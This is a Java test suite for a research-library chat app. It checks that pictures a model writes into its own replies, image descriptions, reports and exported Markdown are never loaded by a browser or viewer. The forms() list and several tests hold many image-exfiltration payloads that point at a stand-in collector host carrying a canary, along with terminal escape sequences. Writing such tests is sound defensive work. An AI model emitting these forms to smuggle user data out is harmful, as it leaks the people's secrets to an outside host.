package org.researchzosho.librarian;

import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.databind.node.ObjectNode;
import org.junit.jupiter.api.AfterEach;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.io.TempDir;
import org.researchzosho.Config;
import org.researchzosho.drive.ContentJudge;

import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.time.Instant;
import java.util.ArrayList;
import java.net.URLDecoder;
import java.util.List;
import java.util.function.BiFunction;
import java.util.function.Supplier;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertTrue;

/**
 * The words a model wrote, shown to the person (0.8.1, the model as the adversary): a picture in them is loaded by the browser when
 * the page is shown, with nobody choosing to follow it, so its address is a way out for whatever the model put into it. Every form a
 * model can write a picture in is tried here, in its own reply and in the lines the library writes around a model's words (a picture
 * described, a verdict's reason, a report read into the chat), and what the chat page would have a browser load is counted.
 *
 * <p>No browser runs in the suite. The count is read off the page as it is served: every address a tag loads by itself (img, source,
 * iframe, script, link, embed, object, video, audio, a style's url()), resolved the way a browser resolves it (a backslash is a slash,
 * two slashes begin a host), kept when it points at another host and the page's own policy lets it through ({@link Pages#imgPolicy}).
 * Each test first sees the instrument count a picture the library found by its own search, which is shown: a zero afterwards means
 * nothing of the model's would be loaded, not that the count sees nothing.
 */
class HostileReplyTest {
    static final ObjectMapper M = new ObjectMapper();
    static final String CANARY = "QX7731MOOR", EVIL = "https://collector.example.net";

    @TempDir Path tmp;
    String home;
    Supplier<List<Images.Engine>> engines; Images.Fetcher fetcher; BiFunction<String, String, Researcher.Drive> drives; BiFunction<ModelEntries.Entry, Images.Fetched, ContentJudge.Reading> check;
    LibraryStore store;

    @BeforeEach void up() throws Exception {
        home = System.getProperty("user.home"); System.setProperty("user.home", tmp.resolve("home").toString()); Config.invalidate();
        engines = Images.ENGINES; fetcher = Images.FETCHER; drives = Vision.DRIVES; check = Images.CHECK;
        Images.ENGINES = () -> List.of(new Images.Engine("Brave", (w, n) -> Images.parseBrave(ImagesTest.fixture("brave-images.json"))), new Images.Engine("SearXNG", (w, n) -> Images.parseSearx(ImagesTest.fixture("searx-images.json"))));
        Images.FETCHER = url -> url.endsWith(".svg") ? new Images.Fetched("<svg/>".getBytes(StandardCharsets.UTF_8), "image/svg+xml") : new Images.Fetched(ImagesTest.square(url), "image/png");
        Images.CHECK = (e, got) -> new ContentJudge.Reading(ContentJudge.Verdict.NO, 0.0, "test");
        store = new LibraryStore(tmp.resolve("lib")); store.init();
        Config.set("RESEARCHZOSHO_DRIVE", "http://homebox:8212"); Config.set("RESEARCHZOSHO_MODEL", "placeholder-model");
    }

    @AfterEach void down() { System.setProperty("user.home", home); Config.invalidate(); Images.ENGINES = engines; Images.FETCHER = fetcher; Vision.DRIVES = drives; Images.CHECK = check; }

    // ---- the instrument: what a page makes a browser load by itself

    /** A tag as the browser reads one (the page's words are escaped, so a tag written in them is no tag), a style block, and the attributes that load. */
    private static final Pattern TAG = Pattern.compile("(?is)<style\\b[^>]*>(.*?)</style>|<([a-z][a-z0-9]*)\\b((?:\"[^\"]*\"|'[^']*'|[^>\"'])*)>");   // a quoted value runs to its closing quote, a > inside it too
    private static final Pattern ATTRIBUTE = Pattern.compile("(?is)\\b(src|srcset|href|data|poster|background|style|content)\\s*=\\s*(?:\"([^\"]*)\"|'([^']*)'|([^\\s>]+))");
    private static final Pattern CSS_URL = Pattern.compile("(?i)url\\(\\s*[\"']?([^\"')\\s]+)");
    private static final List<String> LOADING_TAGS = List.of("img", "source", "iframe", "script", "embed", "video", "audio", "input", "track", "object", "link", "body", "table", "td", "meta");

    /** Every address the page's own tags load from another host, as a browser reads it; {@code allowed}: only those the page's policy lets through. */
    static List<String> loads(String html, boolean allowed) {
        List<String> found = new ArrayList<>();
        Matcher t = TAG.matcher(html);
        while (t.find()) {
            if (t.group(1) != null) { Matcher u = CSS_URL.matcher(t.group(1)); while (u.find()) found.add(u.group(1)); continue; }
            String tag = t.group(2).toLowerCase();
            Matcher a = ATTRIBUTE.matcher(t.group(3));
            while (a.find()) {
                String name = a.group(1).toLowerCase(), v = a.group(2) != null ? a.group(2) : a.group(3) != null ? a.group(3) : a.group(4);
                if (name.equals("style")) { Matcher u = CSS_URL.matcher(v); while (u.find()) found.add(u.group(1)); }   // any tag's own style
                else if (name.equals("content")) { Matcher r = Pattern.compile("(?i)url\\s*=\\s*(\\S+)").matcher(v); if (tag.equals("meta") && r.find()) found.add(r.group(1)); }
                else if (name.equals("href") ? tag.equals("link") : LOADING_TAGS.contains(tag)) found.add(v);
            }
        }
        List<String> out = new ArrayList<>();
        boolean web = Pages.imgPolicy(html).contains("https:");
        for (String a : found) {
            String as = a.strip().replace('\\', '/').replace("&amp;", "&");   // a browser reads a backslash in an address as a slash
            boolean otherHost = as.matches("(?i)^[a-z][a-z0-9+.-]*:.*") ? !as.toLowerCase().startsWith("data:") : as.startsWith("//");
            if (otherHost && (!allowed || web)) out.add(a);
        }
        return out;
    }

    /** The pictures of the web a page shows: each by the library's own address, which fetches it; the addresses on the web they stand for. */
    static List<String> foundShown(String html) {
        List<String> shown = new ArrayList<>();
        Matcher m = Pattern.compile("<img class=\"thumb\" src=\"/found\\?u=([^\"]+)\"").matcher(html);
        while (m.find()) shown.add(URLDecoder.decode(m.group(1), StandardCharsets.UTF_8));
        return shown;
    }

    static List<String> with(List<String> addresses, String what) { return addresses.stream().filter(a -> a.contains(what)).toList(); }

    static ObjectNode message(String role, String content) { ObjectNode m = M.createObjectNode(); m.put("role", role); m.put("content", content); m.put("at", 1L); return m; }

    Librarian.Session sessionWithAFoundPicture() throws Exception {
        Librarian.Session s = Librarian.Session.open(store);
        String found = new Librarian(store, TranslateTurnTest.noModel(), Librarian.person(), s).say("find me some pictures of red fox");
        assertTrue(found.startsWith("6 pictures found"), found);
        return s;
    }

    /** The instrument's own check: the pictures the library found by its own search are on the page, loaded by the browser, and the count sees them. */
    void thePicturesTheLibraryFoundAreCounted(Librarian.Session s) throws Exception {
        String page = Pages.transcript(store, s, 100);
        List<String> shown = foundShown(page);
        assertEquals(6, shown.size(), "the six pictures the search found are shown, each from the library's own address, and the count sees them: " + shown);
        assertTrue(shown.stream().allMatch(a -> a.startsWith("https://")), shown.toString());
        assertEquals(List.of(), loads(page, false), "and the page itself takes nothing from another host, whatever its policy");
    }

    /** Every form a model can write a picture in, in its own reply; each address holds the canary. */
    static List<String> forms() {
        String a = EVIL + "/p.png?d=" + CANARY;
        return List.of(
                "Photographs: ![s](" + a + "1)",                                   // as Markdown writes one
                "![s](" + a + "2)",                                                // in a paragraph of its own
                "Photographs: ![s](" + a + "3\n)",                                 // a line's end before the bracket closes
                "![s](" + a + "4\n)",
                "Photographs: ![s](" + a + "5\r\n)",
                "Photographs: ![s](" + a + "6\t)",
                "Photographs: ![s](" + a + "7 )",
                "Photographs: ![s](\n" + a + "8)",
                "Photographs: !![s](" + a + "9)",                                  // one mark more
                "Photographs: ![![t](" + a + "10)](" + a + "11)",                  // one inside another's words
                "Photographs: ![s](" + a + "12 \"a title\")",                       // with a title, as Markdown allows
                "Photographs: ![s](<" + a + "13>)",                                // in angle brackets
                "Photographs: ![s][1]\n\n[1]: " + a + "14",                        // by reference
                "Photographs: <img src=\"" + a + "15\">",                          // as HTML
                "Photographs: <img src='" + a + "16'>",
                "Photographs: <IMG SRC=" + a + "17>",
                "<picture><source srcset=\"" + a + "18\"></picture>",
                "<iframe src=\"" + a + "19\"></iframe><link rel=\"stylesheet\" href=\"" + a + "20\"><video src=\"" + a + "21\"></video>",
                "<p style=\"background:url(" + a + "22)\">x</p>",
                "<object data=\"" + a + "23\"></object><embed src=\"" + a + "24\">",
                "<meta http-equiv=\"refresh\" content=\"0;url=" + a + "25\">",
                "Photographs: ![s](/\\collector.example.net/p.png?d=" + CANARY + "26)",   // a path a browser reads as another host
                "![s](/\\collector.example.net/p.png?d=" + CANARY + "27)",
                "Photographs: ![s](//collector.example.net/p.png?d=" + CANARY + "28)",
                "Photographs: ![s](/\\/collector.example.net/p.png?d=" + CANARY + "29)",
                "Photographs: ![s](/\t/collector.example.net/p.png?d=" + CANARY + "30)",
                "![s\" src=\"" + a + "31\" x=\"](/images/a.png)",                   // out of the alt text
                "```\n![s](" + a + "32)\n```",                                    // inside a fence
                "```mermaid\nflowchart LR\n A[\"<img src='" + a + "33'>\"] --> B\n```",
                "**![s](" + a + "34)**",
                "`x` ![s](" + a + "35) `y`",
                "[F-0001-a] ![s](" + a + "36)");
    }

    /** A picture in the model's own reply is never loaded, however it is written; the pictures the library found beside it are. */
    @Test
    void aPictureInAModelsOwnReplyIsNeverLoadedHoweverItIsWritten() throws Exception {
        Librarian.Session s = sessionWithAFoundPicture();
        thePicturesTheLibraryFoundAreCounted(s);
        List<String> forms = forms();
        for (String f : forms) { s.append(message("user", "What do my notes say?")); s.append(message("assistant", "The door code is in your notes.\n\n" + f + "\n\nThat is all.")); }
        String html = Pages.transcript(store, s, 1000);
        List<String> loaded = with(loads(html, true), CANARY), written = with(loads(html, false), CANARY);
        System.out.println("[hostile] a picture in the model's own reply, " + forms.size() + " ways of writing one, on a page that shows pictures the library found: " + loaded.size() + " loaded by the browser; " + written.size() + " written as a tag that loads");
        assertEquals(List.of(), loaded, "the browser would load a picture the model wrote");
        assertEquals(List.of(), written, "no tag that loads holds an address the model wrote, whatever the page's policy");
        assertEquals(6, foundShown(html).size(), "and the six the library found are still shown: " + foundShown(html));
        // the same in a conversation with no found picture: the policy lets no picture of the web in at all
        Librarian.Session plain = Librarian.Session.open(store);
        for (String f : forms) { plain.append(message("user", "What do my notes say?")); plain.append(message("assistant", f)); }
        String page = Pages.transcript(store, plain, 1000);
        assertEquals("img-src 'self'", Pages.imgPolicy(page), "a page with no picture the library found lets none in");
        assertEquals(List.of(), with(loads(page, false), CANARY));
    }

    /**
     * The lines the library writes itself carry a model's words too. Here the model that sees is the adversary: it describes the picture
     * the person attached, and gives its reasons for its verdicts on found pictures, with a picture of its own in each whose address
     * holds what it read. Neither is loaded, and neither address may be opened afterwards; the found pictures stay.
     */
    @Test
    void aPictureInTheSeeingModelsWordsIsNeverLoadedNorItsAddressOpened() throws Exception {
        Librarian.Session s = sessionWithAFoundPicture();
        thePicturesTheLibraryFoundAreCounted(s);
        Librarian lib = new Librarian(store, TranslateTurnTest.noModel(), Librarian.person(), s);
        ImagesTest.seeingDefault();
        String inWhy = EVIL + "/why.png?d=" + CANARY, inDescription = EVIL + "/described.png?d=" + CANARY;
        Vision.DRIVES = (d, m) -> ImagesTest.eyes("Yes — a red fox. ![fox](" + inWhy + ")", new ArrayList<>());
        String judged = lib.say("do these pictures show a fox?");
        assertTrue(judged.contains(inWhy), "the verdict's reason is in the library's line, as the model wrote it: " + judged);
        Path card = tmp.resolve("door-card.png"); Files.write(card, Vision.square(255, 0, 0));
        s.att = M.createObjectNode().put("name", "door-card.png").put("path", card.toString());
        Vision.DRIVES = (d, m) -> ImagesTest.eyes("A door card. It reads: archive room, code " + CANARY + ".\n\n![card](" + inDescription + ")", new ArrayList<>());
        String described = lib.say("what is in this picture?");
        assertTrue(described.contains(inDescription), "the description is the library's line, as the model wrote it: " + described);
        String html = Pages.transcript(store, s, 1000);
        List<String> loaded = with(loads(html, false), CANARY);   // whatever the page's policy: no tag that loads holds it
        boolean whyGiven = GivenAddresses.given(inWhy), describedGiven = GivenAddresses.given(inDescription);
        System.out.println("[hostile] a picture in the seeing model's words (a verdict's reason, a description of the person's own picture): " + loaded.size() + " loaded by the browser; openable afterwards: "
                + ((whyGiven ? 1 : 0) + (describedGiven ? 1 : 0)) + " of 2");
        assertEquals(List.of(), loaded, "the browser would load a picture the seeing model wrote into the library's line");
        assertFalse(whyGiven, "an address in a verdict's reason is the model's, and is not given");
        assertFalse(describedGiven, "an address in a description is the model's, and is not given");
        // what the search found is given, as before: the page of a found picture may be opened
        assertTrue(GivenAddresses.given("https://a-z-animals.com/animals/red-fox/pictures/"), "the page of a picture the search found may be opened");
        // and a conversation opened again from disk shows and gives the same
        Librarian.Session again = Librarian.Session.resume(store, s.id);
        new Librarian(store, TranslateTurnTest.noModel(), Librarian.person(), again);
        assertEquals(List.of(), with(loads(Pages.transcript(store, again, 1000), true), CANARY));
        assertFalse(GivenAddresses.given(inWhy) || GivenAddresses.given(inDescription));
        assertTrue(foundShown(Pages.transcript(store, again, 1000)).size() >= 6, "the found pictures are shown in the conversation opened again");
    }

    /**
     * A report read into the chat: its words are a model's. The web chat's own lines (a report read with /read, a run that ended and what
     * its model said) are shown as the library's, and a picture in them is not loaded.
     */
    @Test
    void aPictureInAReportReadIntoTheChatIsNeverLoaded() throws Exception {
        Librarian.Session s = sessionWithAFoundPicture();
        thePicturesTheLibraryFoundAreCounted(s);
        String a = EVIL + "/report.png?d=" + CANARY;
        store.write(new Investigation("I-0001-kestrel-crossing", "The Kestrel crossing", Finding.State.accepted, "model:stand-in", Instant.now().toString(), List.of(), List.of(),
                "## Question\n\nWhen?\n\n## Answer\n\nIn 1952.\n\n![record](" + a + "1)\n\nSee ![record](" + a + "2\n) too.\n"));
        ChatCommands.Front front = new ChatCommands.Front() {
            @Override public Librarian.Session session() { return s; }
            @Override public String open() { return s.id; }
            @Override public Librarian.Session resume(String id) { return s; }
        };
        String read = ChatCommands.reply(store, Librarian.person(), "web:" + s.id, "/read I-0001-kestrel-crossing", false, front);
        assertTrue(read != null && read.contains(a + "1"), "the report is read into the chat, its words as written: " + read);
        Pages.chatReplied(s, "/read I-0001-kestrel-crossing", read);
        // a line of the library's own that quotes a model: a run that ended with what its model said
        ObjectNode told = message("assistant", "Research run J-0007 ended. The model declined it. What the model said: \"see ![x](" + a + "3) and ![x](" + a + "4\n)\"");
        told.put("by", "library"); s.append(told);
        String html = Pages.transcript(store, s, 1000);
        List<String> loaded = with(loads(html, false), CANARY);   // whatever the page's policy: no tag that loads holds it
        System.out.println("[hostile] a picture in a report read into the chat with /read, and in a line that quotes a model: " + loaded.size() + " loaded by the browser");
        assertEquals(List.of(), loaded, "the browser would load a picture a model wrote, from a line of the library's own");
        assertEquals(List.of(), with(loads(html, false), CANARY));
    }

    /** A report's own page, a claim's, a run's result: a picture of the web in them is a link, in every form above. */
    @Test
    void aPictureInAReportOrAClaimIsNeverLoadedOnItsPage() {
        List<String> forms = forms();
        StringBuilder body = new StringBuilder("## Answer\n\nIn 1952.\n\n");
        for (String f : forms) body.append(f).append("\n\n");
        // the page's words beside a picture of the library's own, which is drawn: the instrument sees a tag that loads
        String html = Pages.md(body + "![kept](/images/kept.png)\n");
        assertTrue(html.contains("src=\"/images/kept.png\""), "a picture of the library's own is drawn: " + html);
        List<String> written = with(loads(html, false), CANARY);
        System.out.println("[hostile] a picture in a report's or a claim's words, " + forms.size() + " ways of writing one, on its own page: " + written.size() + " written as a tag that loads");
        assertEquals(List.of(), written, "a report's page holds a tag that loads an address its model wrote");
    }

    /**
     * The map's names are a claim's words, a model's. The page's script writes them into the page with its own escaper, inside a quoted
     * attribute among other places; in 0.8.0 the escaper left quotes alone, so a name could close the attribute and add an event handler,
     * which the page's policy lets run. No script runs in the suite: this reads the script as it is served. (The escaper was run in a
     * JavaScript engine once, outside the suite, on such a name: 0.8.0 wrote two attributes of the name's own into the tag, this one none.)
     */
    @Test
    void aNameOnTheMapIsEscapedForAnAttributeAndEveryValueGoesThroughTheEscaper() {
        String script = MapPage.body("") + MapPage.script();   // the page and its script, a file of the library's own since 0.8.1
        Matcher esc = Pattern.compile("function esc\\(s\\)\\{return String\\(s\\)\\.replace\\(/\\[([^\\]]+)\\]/g").matcher(script);
        assertTrue(esc.find(), "the page's escaper: " + script);
        for (char c : new char[]{'&', '<', '>', '"', '\'', '`'}) assertTrue(esc.group(1).indexOf(c) >= 0, "the escaper takes " + c + ": " + esc.group(1));
        // every value of the answer that is joined into the page's markup goes through the escaper or into an address's own encoding;
        // the one that does not is a number the service counted
        Matcher joined = Pattern.compile("'\\+\\(?((?:j|s|e|n|q|msg)\\b[A-Za-z0-9_.\\[\\]&|]*)").matcher(script);
        List<String> raw = new ArrayList<>();
        // not values written into the page: the count, the side panel's own markup put back, and the three conditions that ask whether a value is there
        List<String> notWritten = List.of("s.degree", "s.innerHTML", "j.resolved_from", "j.node.wikidata", "j.open&&j.open.length", "j.open.map");
        while (joined.find()) if (!notWritten.contains(joined.group(1))) raw.add(joined.group(1));
        assertEquals(List.of(), raw, "a value of the map's answer is joined into the page as it came");
        assertTrue(script.contains("esc(j.node.wikidata)") && script.contains("j.open.map(esc)") && script.contains("data-n=\"'+esc(s.label)+'\""), script);
    }

    /**
     * What a program that opens a Markdown file would load by itself: a picture not of this library's own path, and a tag that could
     * ask an address, outside code. A tag asks one only through an attribute's value, so a tag with none ({@code <br>}, {@code </p>},
     * the {@code <String>} of a line of code) is not counted, unless its own content is read as code or a style sheet.
     */
    static List<String> drawnByAViewer(String markdown) {
        List<String> out = new ArrayList<>();
        boolean fence = false;
        for (String line : markdown.split("\n", -1)) {
            if (line.stripLeading().startsWith("```")) { fence = !fence; continue; }
            if (fence) continue;
            String words = line.replaceAll("`[^`\n]*`", "");
            Matcher pic = Pattern.compile("!\\[[^\\]]*\\](?!\\(/(?![/\\\\])[^)\\s\\\\]*\\))").matcher(words);
            while (pic.find()) out.add("picture: " + words.substring(pic.start(), Math.min(words.length(), pic.start() + 90)));
            Matcher tag = Pattern.compile("<[A-Za-z/!?][^>]*>?").matcher(words);
            while (tag.find()) { String t = tag.group(); if (t.contains("=") || !t.endsWith(">") || t.startsWith("<!") || t.startsWith("<?") || t.matches("(?i)</?(script|style|base|link|meta|iframe|object|embed|svg)\\b.*")) out.add("tag: " + t); }
        }
        return out;
    }

    /**
     * The files the library writes for other programs: a report or a claim exported as Markdown, and the vault an editor such as
     * Obsidian opens. An editor draws a picture and reads a tag as it shows the file. The words are a model's: every form above is
     * written into a report and a claim, and the files are read as such a program reads them. The library's own picture and a sample of
     * code stay as they were (the control: the count sees a picture and a tag when one is there).
     */
    @Test
    void aMarkdownFileWrittenForAnotherProgramHoldsNoPictureOfTheWebAndNoTag() throws Exception {
        assertEquals(2, drawnByAViewer("See ![s](" + EVIL + "/a.png) and <img src=\"" + EVIL + "/b.png\"> here.").size(), "the count sees a picture and a tag in a file that holds them");
        StringBuilder body = new StringBuilder("## Question\n\nWhen?\n\n## Answer\n\nIn 1952.\n\n");
        for (String f : forms()) body.append(f).append("\n\n");
        body.append("![kept](/images/kept.png)\n\nThe list is `List<String>` and the call is:\n\n```\nMap<String, List<String>> m; // ![x](y)\n```\n");
        store.write(new Investigation("I-0001-kestrel-crossing", "The Kestrel <img src=" + EVIL + "/t.png?d=" + CANARY + "> crossing", Finding.State.accepted, "model:stand-in", Instant.now().toString(), List.of(), List.of(), body.toString()));
        store.write(new Finding(store.nextFindingId("ferry record"), "The ferry ![t](" + EVIL + "/title.png?d=" + CANARY + ") record", List.of(), Finding.State.accepted, Finding.ClaimType.extraction, Finding.Confidence.medium, "model:stand-in",
                Instant.now().toString(), "2026-11-20", Finding.Volatility.slow, "", List.of(new Finding.Source("https://example.org/record", "n/a", "the record")), List.of(), null, "She crossed in 1952. ![s](" + EVIL + "/claim.png?d=" + CANARY + ")\n\n<img src=\"" + EVIL + "/claim2.png?d=" + CANARY + "\">\n"));
        new LibrarianIndex(store, Embeddings.none()).rebuild();
        String report = new String(Export.markdown(store, "I-0001-kestrel-crossing", null).bytes(), StandardCharsets.UTF_8);
        String asPage = new String(Export.report(store, "I-0001-kestrel-crossing", Export.MARKDOWN, "").file().bytes(), StandardCharsets.UTF_8);
        Path vault = tmp.resolve("vault");
        Vault.generate(store, vault);
        StringBuilder notes = new StringBuilder();
        try (var files = Files.walk(vault)) { for (Path f : files.filter(x -> x.toString().endsWith(".md")).sorted().toList()) notes.append(Files.readString(f)).append("\n\n"); }
        assertTrue(notes.toString().contains(CANARY) && report.contains(CANARY) && asPage.contains(CANARY), "the files hold the model's words, the addresses in them as text");
        List<String> inExport = drawnByAViewer(report), inPage = drawnByAViewer(asPage), inVault = drawnByAViewer(notes.toString());
        System.out.println("[hostile] Markdown written for other programs, " + forms().size() + " ways of writing a picture or a tag (" + drawnByAViewer(body.toString()).size() + " drawn or read as markup in the words as the model wrote them): the exported report " + inExport.size() + ", the report as its page " + inPage.size() + ", the vault's notes " + inVault.size() + " drawn or read as markup by a viewer");
        assertEquals(List.of(), inExport, "the exported report holds something a viewer loads by itself");
        assertEquals(List.of(), inPage);
        assertEquals(List.of(), inVault, "a note of the vault holds something an editor loads by itself");
        // nothing here decides what is code (no reader of Markdown is on the class path, and a rule of this program's own read it wrongly):
        // the library's own picture and the code's brackets are as they were, and a picture's mark is taken off in code as outside it
        assertTrue(report.contains("![kept](/images/kept.png)") && report.contains("`List<String>`") && report.contains("Map<String, List<String>> m; // [x](y)"), "the library's own picture and the code's own brackets are as they were: " + report);
        assertEquals("The loop `for (i = 0; i &lt;n; i++) a[i] = b>c;` and <br> and </p>", Export.forAViewer("The loop `for (i = 0; i <n; i++) a[i] = b>c;` and <br> and </p>"), "a bracket is written as the character it is where a value could follow before the next closing one, in code too; a tag with no value stays");
    }

    /** What the terminal chat prints: a model's words with no character a terminal obeys. */
    @Test
    void theTerminalIsSentNoControlCharacterOfAModels() {
        String esc = "\u001B";
        String reply = "The door code is in your notes." + esc + "]8;;" + EVIL + "/t?d=" + CANARY + esc + "\\click" + esc + "]8;;" + esc + "\\ " + esc + "]0;a title" + "\u0007" + esc + "[2J" + "\u009B31m" + "\nSecond line\tkept.";
        String shown = ChatIo.plain(reply);
        assertEquals(0, shown.chars().filter(c -> Character.isISOControl(c) && c != '\n' && c != '\t').count(), "no control character is left: " + shown);
        assertTrue(shown.contains("The door code is in your notes.") && shown.contains("\nSecond line\tkept."), "the words, their line ends and tabs are: " + shown);
    }
}
